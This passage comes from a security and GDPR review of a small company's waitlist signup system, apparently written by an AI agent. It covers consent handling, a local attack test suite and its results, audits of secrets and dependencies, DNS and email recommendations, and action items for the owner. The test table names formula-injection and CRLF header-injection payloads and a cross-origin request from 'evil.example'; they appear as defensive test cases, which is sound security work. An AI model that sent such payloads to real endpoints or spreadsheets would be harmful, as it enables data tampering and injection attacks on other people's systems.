`needs_reconsent`, but they are distinguishable because the work differs: `mismatch` means
re-consent a person, `unverifiable` usually means tag the identifiers and the rows resolve
themselves.

Only the **EEA-person-shown-non-EEA-copy** direction is assessed. The converse over-protects the
person and breaks nothing, so flagging it would only add noise to the one column that has to stay
actionable. A non-EEA visitor with an untagged id stays `ok` — CAN-SPAM does not ask where the
wording was written.

To work the queue: filter `needs_reconsent = TRUE`, split by `consent_regime_status`, and treat
`mismatch` rows as consent not validly obtained — re-consent through the current form, or exclude
from EEA sends. `reconsent_reason` carries the detail, e.g.
`marketing+health_consent_text_is_us_but_country_is_eea:NO`.

`registry_match: false` flags a record whose wording could not be resolved — the signup is still
accepted, because rejecting would mean a copy change that forgets to register a wording breaks every
signup on the site. It is logged as `consent.unregistered_text_version` so it gets fixed rather than
accumulating quietly.

### The other rights, and how each is actually served

| Right | How we serve it |
|---|---|
| **Access** (Art 15) | Return the row contents plus source, recipients, retention period, and the transfer basis in §5.5 |
| **Portability** (Art 20) | **JSON or CSV** export of the fields the person supplied. This right applies here — processing is consent-based and automated — and it is *not* the same as access: it covers data they gave us, in a machine-readable form, transmissible to another controller |
| **Rectification** (Art 16) | Edit the cell; if the address itself changes, treat as delete + re-add so the consent record stays coherent |
| **Restriction** (Art 18) | Move the row to a `restricted` tab and exclude that tab from every send |
| **Objection** (Art 21) | For direct marketing there is **no balancing test**. Stop immediately, suppress, done |
| **Withdraw consent** (Art 7(3)) | Must be as easy as giving it. The unsubscribe link satisfies this for marketing; health-data consent must be withdrawable **separately**, without leaving the waitlist |
| **Complain** (Art 77) | Datatilsynet, for Norwegian subjects. They may go straight there without contacting us first |

### Two honest gaps

- **`localStorage`.** Deletion cannot reach a copy already sitting in a visitor's own browser. S8's
  fix removes the copy prospectively; existing ones clear when the visitor clears site data. Stated
  in the privacy policy rather than papered over — an erasure promise should be accurate about its
  own limits.
- **Manual execution.** Every step above is a human editing a spreadsheet. At 127 records that is
  entirely workable and I am not going to recommend building tooling for it. At a few thousand it
  stops being workable, and the one-month clock is a legal deadline rather than a target.

## 7. Verification

Attack harness: `scripts/attack-waitlist.mjs`. Run against a local instance —
**never against production**, for the reason in the note below.

| # | Attack | Expected |
|---|---|---|
| 1 | Valid minimal payload (`email` + `consent_marketing`) | `200 {"ok":true}` |
| 2 | `GET` / `PUT` / `DELETE` on the endpoint | `405` |
| 3 | `Content-Type: text/plain` | `415` |
| 4 | 1 MB body | `413`, connection cut before parse |
| 5 | Unknown key `{"isAdmin":true}` | `400 validation` |
| 6 | `name` = `=IMPORTXML(...)` formula payload | stored as `'=IMPORTXML(...)`, inert |
| 7 | `\r\n` header-injection chars in every string field | `400 validation` |
| 8 | 100 requests in 10s from one IP | first 5 `200`, remainder `429` |
| 9 | Filled honeypot `hp_field` | `200 {"ok":true}` — accepted and silently discarded, so bots learn nothing |
| 10 | `form_render_ts` 500 ms ago | rejected as bot |
| 11 | `admin@`, `postmaster@`, `@mailinator.com` | `400 validation` |
| 12 | Same email twice | `200` then `409 duplicate` |
| 13 | `grep -r "script.google.com" dist/` after `npm run build` | no matches |
| 14 | Header scan against a preview deploy | CSP, HSTS, nosniff, Referrer-Policy, Permissions-Policy, frame-ancestors present |

Results are recorded in §8 once each fix lands.

> **A note on what I deliberately did not test.** The brief asks for 100 rapid requests and
> malformed payloads against the endpoint. Run against the *current* production webhook, that would
> write ~100 junk rows into the real 136-row pre-order sheet and visibly inflate the traction
> counter on the live site. I ran exactly one read-only `GET` against production — enough to confirm
> the endpoint is unauthenticated and returns only a count — and nothing else. The full attack suite
> runs against the hardened endpoint locally. If you want the current webhook's write path
> demonstrated against production, say so and I will send a single row tagged
> `sectest-delete-me@example.invalid` that you can delete in one click.

## 8. Results

### Endpoint attack suite — `npm run security:test`

**55 of 55 cases pass.** The harness boots the real handler behind a local HTTP server and attacks
it; it never touches production. Selected results:

```
✓ Valid minimal payload                       200 {"ok":true}
✓ Method GET / PUT / DELETE / PATCH           405
✓ Content-Type: text/plain                    415
✓ Content-Type: form-urlencoded               415        ← blocks cross-origin form CSRF
✓ 1 MB body                                   413
✓ Chunked 320 KB body, no Content-Length      413        ← stream counter, not the header
✓ Unknown key {"isAdmin":true}                400 validation
✓ Unknown key inside utm object               400 validation
✓ CRLF in email / page_path                   400 validation
✓ RTL override char in utm.campaign           400 validation
✓ consent_marketing missing / false / "true"  400 validation
✓ 4 motivations / invalid enum / 4-digit zip  400 validation
✓ admin@, postmaster@, @mailinator.com        400 validation
✓ Cross-origin POST (Origin: evil.example)    403
✓ Malformed JSON: garbage/array/string/null   400 validation
✓ 100 rapid requests from one IP              5×200, 95×429, 0 other
✓ 429 carries Retry-After                     Retry-After: 60
✓ 429 body leaks no internals                 {"ok":false,"error":"rate_limited"}
✓ Spoofed X-Forwarded-For                     still 429  ← last hop, not first
✓ Filled honeypot                             200 {"ok":true}, log: reject.bot honeypot
✓ Sub-2-second submission                     200 {"ok":true}, log: reject.bot too_fast
✓ Human-speed submission (9s)                 200 {"ok":true}, log: accepted
✓ 5 formula-injection payloads                all prefixed with ' → inert text
✓ Tab-escape formula payload                  neutralized
✓ Nested utm formula payload                  neutralized
✓ motivation without consent_health           dropped, stored as null
✓ Zero-width char in email                    normalized to the same address
✓ Full-width ＠ in email                       normalized via NFKC
✓ Error response echoes submitted input       no — canary string absent from body
```

Two findings came out of running it rather than writing it:

- The oversized-chunked case initially failed. The server was right — `curl` received a clean
  `413 {"ok":false,"error":"payload_too_large"}` — but the handler destroyed the socket before the
  response flushed, so a client that was still uploading saw a connection reset instead of a status.
  Fixed by responding, sending `Connection: close`, and only then tearing down. The test now drives
  a raw socket, because Node's `fetch` discards an early response that arrives mid-upload and was
  measuring the client rather than the server.
- The rate-limit test only proves what it claims because each case draws a fresh source IP.
  Without that, state bleeds between cases and later assertions pass for the wrong reason.

### Apps Script migration — `npm run security:test:sheet`

**17 of 17 checks pass.** Loads the real `server/apps-script/Code.gs` into a sandbox with the Apps
Script globals stubbed, points it at a mock sheet carrying the *current* header row
(`Timestamp, name, email, phone, hearAbout, reason`), and asserts which cell each field lands in.

Written in response to a silent data-loss bug the Conversion agent spotted: the old modal posts
`hearAbout`/`reason`, the new contract posts `referral_source`/`motivation`, and a key the script
does not recognise is written **nowhere, with no error**. A row appears; the cells are just empty.

```
Scenario A — legacy modal → hardened script (the live fallback path)
  ✓ legacy name / phone / hearAbout / email all stored
  ✓ legacy "reason" dropped (Art 9, no consent) AND logged, not silent
  ✓ no duplicate column created for existing "Timestamp"
Scenario B — new contract → hardened script
  ✓ referral_source, motivation, consent_version, utm_source, zip, flavor all land correctly
  ✓ legacy columns left empty
Scenario C  ✓ motivation dropped when consent_health is false
Scenario D  ✓ existing "E-Mail" / "Consent TS" reused, no duplicate columns
Scenario E  ✓ wrong token and missing token both rejected
```

Running it found two further defects **in my own script**, both now fixed:

- **`name` and `phone` were also being dropped.** I built `COLUMNS` from the frozen contract, which
  contains neither, so the hardened script would have discarded both — the same bug one layer down
  from the one that was reported. Now preserved as legacy columns.
- **Header matching was case-sensitive.** An existing `Email` column would not have matched
  canonical `email`, so a *second* `email` column would have been created and the data split across
  the two. Now case- and separator-insensitive.

The one deliberate drop is legacy `reason`: Art 9 health data with no consent behind it on the old
path. Discarding it is the lawful behaviour, and it now writes `legacy_reason_dropped` to the
execution log so it is a known drop rather than a silent one.

**Deployment-ordering hazard, recorded because it would be catastrophic and quiet:** the hardened
script requires a token, the old modal sends none, and the old modal uses `mode:"no-cors"` so it
*cannot read the rejection*. Rotating the Apps Script before the new client ships would make every
visitor see "You're on the list" while every signup is discarded, with no error anywhere. The
ordering and the per-cell verification steps are in `HANDOFF-sec.md` §3b.

### Secrets

```
$ git log --all --diff-filter=A --name-only | grep -iE '\.env|secret|credential|key|token'
(none)
```
Every blob in all 20 commits scanned against AWS / Stripe / Slack / GitHub / Google API /
SendGrid / Resend / JWT / connection-string / PEM patterns — **no matches**. No `VITE_` or
`import.meta.env` usage exists, so nothing can leak via Vite's public-env mechanism.

### Client bundle

```
$ npm run build && node -e "…read dist/assets/*.js…"
bundle bytes:            238090
contains ZodError:       false     ← server-only validation stays server-side
contains UPSTASH:        false
contains SHEETS_WEBHOOK: false
```

**Still failing, and expected to:** `grep -r "script.google.com" dist/` matches. The client
component still calls the Apps Script directly, and that file belongs to another agent. **Until the
change in `HANDOFF-sec.md` §1 lands, S1 and S3 are only half fixed** — the hardened endpoint exists
but nothing is forced through it. This is the single most important open item on the branch.

### Supply chain

`npm audit`: **9 advisories (2 low, 7 high) → 0**, via `npm audit fix` with no `--force` and no
`package.json` range changes. All nine were devDependencies (`vite`, `postcss`, `@babel/core`,
`launch-editor`) and none reached the production bundle — but one was arbitrary file read via the
Vite dev server, and three dev servers are running on Emil's laptop right now.

No third-party script tags, no analytics, no tag manager, nothing loading remote code at runtime.
The only external subresource is Google Fonts (S10). `zod` is the one dependency added: server-only,
actively maintained, no install scripts. Dependabot config added at `.github/dependabot.yml`.

### Headers — baseline, before this branch

`npm run security:headers` against live `https://zucasnacks.com`:

```
✓ strict-transport-security      max-age=63072000
✗ x-content-type-options         (absent)
✗ content-security-policy        (absent)
✗ x-frame-options                (absent)
✗ referrer-policy                (absent)
✗ permissions-policy             (absent)
✗ content-security-policy-report-only (absent)
✗ access-control-allow-origin: * on static responses
✗ /api/waitlist                  404 — endpoint does not exist yet
8 checks failed.
```

Two things this measurement changed:

- Vercel already sends HSTS at `max-age=63072000`. My first draft of `vercel.json` set
  `31536000; includeSubDomains`, which would have **halved** the existing max-age. Corrected to
  `63072000`. `includeSubDomains` is deliberately still off — DNS is at WordPress.com, there may be
  a subdomain I cannot enumerate, and the setting sticks in browsers for two years. Owner action 10.
- `access-control-allow-origin: *` on static responses is Vercel's default. Harmless for public
  assets, and `Cross-Origin-Resource-Policy: same-origin` now constrains it. What matters is that
  the *write* endpoint never carries it — verified above, cross-origin POST returns `403` with no
  ACAO header at all.

Re-run `npm run security:headers` against the preview deploy after merge to confirm the configured
headers are actually emitted. A header declared in `vercel.json` and a header on the wire are
different claims.

## 9. What only you can do (outside the codebase)

Ranked by urgency. **Items 1–3 must be settled before a single email is sent.**

0. **Do not send the EEA half of the campaign until §5 is resolved.** This is the one item on the
   list that is irreversible: DNS records can be edited, credentials can be rotated, an email to 127
   Norwegians cannot be recalled. The US half (Vituity, 6,000+ physicians) is unaffected and can
   proceed on schedule.
1. **Send §5 of this document to Cooley** — specifically §5.4, the question of what may lawfully be
   done with the existing ~127 records. That is a legal judgement call, not an engineering one, and
   I have given you the analysis rather than an answer. Ask them two things: *(a)* is a single email
   confined to the original pre-order purpose defensible, and *(b)* what does the re-permission
   route look like if not.
2. **Segment the list by country before anything is sent.** The `+47` prefixes, postal codes, `.no`
   email TLDs and signup origin will get you most of the way. Two lists, two rulebooks. Also
   reconcile the count discrepancy while you are in there — the live counter reads 136 and you said
   127.
3. **Appoint a GDPR Art 27 EEA representative.** A non-EEA controller offering goods to people in
   the EEA must designate one *in writing* in a member state where those people are. The Art 27(2)
   exemption for occasional processing does not apply to us because we process special category
   data. Commercial services cost roughly €200–500/year; several are Norway-based. Their name and
   address then go into `public/privacy.html` — there is a marked placeholder waiting for them.
4. **Publish DMARC.** No record exists today. Add a TXT record at `_dmarc.zucasnacks.com`:
   `v=DMARC1; p=none; rua=mailto:dmarc@zucasnacks.com; fo=1` — start at `p=none` to collect reports
   without risking legitimate mail, then move to `p=quarantine` after ~2 weeks of clean reports, and
   `p=reject` after a month. Do this *before* the campaign, not after.
5. **Enable DKIM in Google Workspace.** `google._domainkey.zucasnacks.com` is empty, which means
   Workspace DKIM was never switched on. Admin console → Apps → Google Workspace → Gmail →
   Authenticate email → Generate new record → publish the TXT → Start authentication. Without DKIM,
   DMARC cannot pass on forwarded mail.
6. **Rotate the Apps Script deployment.** The current URL is public and write-capable. In Apps
   Script: Deploy → Manage deployments → **archive the existing deployment** (this is what actually
   kills the old URL) → paste the hardened `Code.gs` → create a *new* deployment → put the new URL
   in Vercel as `SHEETS_WEBHOOK_URL` and the secret as `SHEETS_WEBHOOK_TOKEN`. I have not touched
   your credentials, per the engagement rules.
7. **Audit the existing rows for formula-injection payloads** before opening the sheet on a
   machine you care about. Safest method: File → Download → CSV, then inspect the CSV in a plain
   text editor for cells starting with `=`, `+`, `-`, or `@`. Do not open it in Excel either.
8. **Create `privacy@zucasnacks.com`** — the privacy policy names it as the rights address and it
   must actually receive mail.
9. **Decide and record who has access to the sheet.** Check Share settings: it should be
   "Restricted", named individuals only, with **no** "anyone with the link" entry. Every person on
   that list can read every pre-order.
10. **Provision Upstash in an EU region** (`eu-west-1` / `eu-central-1`). Google and Vercel are
    both certified under the EU–US Data Privacy Framework so transfers to them are covered; Upstash
    is not on that list. Choosing an EU region removes the question rather than needing a safeguard
    for it. **The region is fixed at database creation and cannot be changed afterwards.** Also set
    `EMAIL_HASH_PEPPER` (`openssl rand -hex 32`) — without it, email handles fall back to an unkeyed
    hash that is reversible by enumeration.
11. **Write a one-page Art 30 record of processing, and get the Art 28 processor agreements on
    file.** The under-250-employee exemption from Art 30 does not apply to us, because it is
    disapplied the moment special category data is involved. The record is a table: purposes,
    categories of data and people, recipients, transfers, retention, security measures — §2, §5.5
    and §6 of this document already contain every answer, it just needs to live in one place. For
    Art 28, Google's Cloud Data Processing Addendum and Vercel's DPA both need accepting in their
    respective consoles; Upstash's on request.

12. **Add a CAA record:** `zucasnacks.com. CAA 0 issue "letsencrypt.org"` and
   `0 issue "digicert.com"` (Vercel uses Let's Encrypt).
13. **Get counsel to review the legal pages.** I wrote `/privacy` and `/terms` to describe what the
   code actually does, which is the hard part and the part I can verify. They are not a substitute
   for review by a lawyer. **Cooley already advises Zuca — send them these two pages and the health-
   claim list in `HANDOFF-sec.md` together.** The health claims are the more urgent of the two.

## 10. The auto-response email — recommendation and tradeoffs

You asked for a recommendation rather than an implementation, so this is analysis. Nothing in this
section is built yet.

### 10.1 Apps Script is the wrong tool, and your instinct on why is right

Apps Script's `MailApp`/`GmailApp` sends **as the account that owns the script** — today
`chefemilnordin@gmail.com`, the account you are migrating away from. There is no way to make it send
as `emil@zucasnacks.com` short of transferring script ownership to that account, which just moves
the problem.

Three further reasons, any one of which would be disqualifying on its own:

- **Quota.** 100 recipients/day on a consumer account, 1,500 on Workspace. A launch announcement to
  137 people plus a campaign would hit that.
- **No bounce or complaint handling.** Nothing tells you an address is dead, so hard bounces
  accumulate and your sender reputation degrades invisibly.
- **`@gmail.com` cannot pass DMARC alignment for `zucasnacks.com`.** The whole DKIM/SPF/DMARC setup
  you are about to publish would be bypassed by the one system sending the most mail.

### 10.2 Recommendation

**A dedicated email service, sending from a subdomain, with the auto-response as a confirmed
opt-in.** Three separable decisions:

**(a) Which provider.** I would pick **Resend** or **Postmark**.

| | Resend | Postmark | AWS SES | Apps Script |
|---|---|---|---|---|
| Deliverability | good | **best in class** | good, needs warmup | poor |
| Setup effort | lowest | low | high | n/a |
| Cost at your volume | free → ~$20/mo | ~$15/mo | ~$1/mo | free |
| Bounce/complaint handling | yes | **yes, excellent** | manual | **no** |
| Separates transactional from bulk | yes | **yes, enforced** | manual | no |
| Sends as `emil@zucasnacks.com` | yes | yes | yes | **no** |

**Resend** if you value setup speed and cost. **Postmark** if deliverability into physician inboxes
is the priority — it is stricter about what it will send, which is precisely why its reputation
holds. Either is defensible. **SES** is cheapest and I would not recommend it here: it is the most
operational work, and you do not have an ops person.

**(b) Separate the sending domains.** This matters more than the provider choice.

- Transactional (auto-response, confirmations): `mail.zucasnacks.com`
- Marketing (the outbound campaign): `news.zucasnacks.com`

If the cold campaign draws complaints — and cold campaigns do — reputation damage is contained to
the subdomain that earned it. Your confirmation emails keep arriving. Sharing one domain means a bad
week on the campaign silently stops people receiving the email that proves they signed up.

**(c) Make the auto-response a confirmed opt-in (double opt-in).** The strongest recommendation
here, and it costs one extra click.

The email contains a confirmation link; consent is not treated as complete until it is clicked. That
converts your Art 7(1) evidence from *"our server recorded a ticked box"* into *"the person
demonstrably controls this mailbox and acted twice"*. Given §5.4 — where the existing ~127 records
have no demonstrable consent at all — this is the difference between building the same problem again
and not.

**Tradeoff, stated honestly: 10–30% never click, so your list shrinks.** That is a real cost and you
should decide it deliberately. My view is it is worth paying: a smaller list you can lawfully email
beats a larger one you cannot, and unconfirmed addresses are disproportionately typos and spamtraps
that damage deliverability anyway.

### 10.3 How it interacts with the DNS work already on your list

This is the part that changes the DNS blocker, so read it before doing item 4.

- **SPF has a hard limit of 10 DNS lookups**, and exceeding it makes the record fail — not degrade,
  fail. `include:_spf.google.com` already consumes several. Adding an ESP include to the root domain
  risks tipping over it.
  **Using a subdomain sidesteps this entirely:** `mail.zucasnacks.com` gets its own SPF record with
  its own budget, and the root record stays as it is. Another reason for (b).
- **DKIM does not conflict.** The ESP gives you CNAMEs on its own selector; Google's lives at
  `google._domainkey`. Both coexist. Do item 5 (enable Workspace DKIM) regardless — it covers mail
  Emil sends by hand.
- **DMARC at the root covers subdomains** unless you set `sp=` or publish a subdomain record. With
  relaxed alignment, mail from `mail.zucasnacks.com` aligns with `zucasnacks.com`. So publish DMARC
  first at `p=none` (item 4), add the ESP, confirm the aggregate reports show it passing, and only
  then tighten to `p=quarantine`. **Tightening before the ESP is verified would send your own
  confirmation emails to spam.**
- **Order matters:** DMARC `p=none` → Workspace DKIM → ESP subdomain + its SPF/DKIM → two weeks of
  clean reports → `p=quarantine` → `p=reject`.

### 10.4 Security requirements for whatever you pick

- **The API key is server-side only.** Same rule as `SHEETS_WEBHOOK_URL`: never a `VITE_` prefix,
  never in the bundle. Add `RESEND_API_KEY` (or equivalent) to `.env.example` when you choose.
- **Never render user input as HTML.** The confirmation email will greet people by name, and a name
  is attacker-controlled. Escape it, or send plain text. This was in the original engagement brief
  and it still applies.
- **Send from a real, monitored mailbox.** `hello@` or `emil@`, not `no-reply@` — someone replying
  to a confirmation is a customer, and CAN-SPAM plus general decency want that reply to arrive
  somewhere.
- **The auto-response must stay transactional.** A message confirming a signup is lawful everywhere,
  including the EEA, *because* it is not marketing. Add product promotion to it and it becomes a
  marketing email subject to §5.2 — and then it needs prior consent it may not have. Confirm the
  signup, link the privacy policy, offer the confirmation click, stop.
- **Unsubscribe in every message**, including a `List-Unsubscribe` header, not just a footer link.
- **Rate limit it.** The send is triggered by a public endpoint. It is already behind the waitlist
  rate limiter, but if the ESP is called on every accepted signup then a burst that passes the
  limiter is a burst of email. Cap sends independently.

### 10.5 What I would do, in order

1. Publish DMARC `p=none` (already item 4).
2. Enable Workspace DKIM (already item 5).
3. Pick Resend or Postmark. Verify `mail.zucasnacks.com`, publish its SPF and DKIM records.
4. Send the auto-response as a confirmed opt-in from `emil@zucasnacks.com` via that subdomain.
5. Watch DMARC aggregate reports for two weeks.
6. Only then `p=quarantine`, and set up `news.zucasnacks.com` separately for the campaign.

Steps 1 and 2 are on your list already and block nothing else here. Step 3 is roughly an hour.
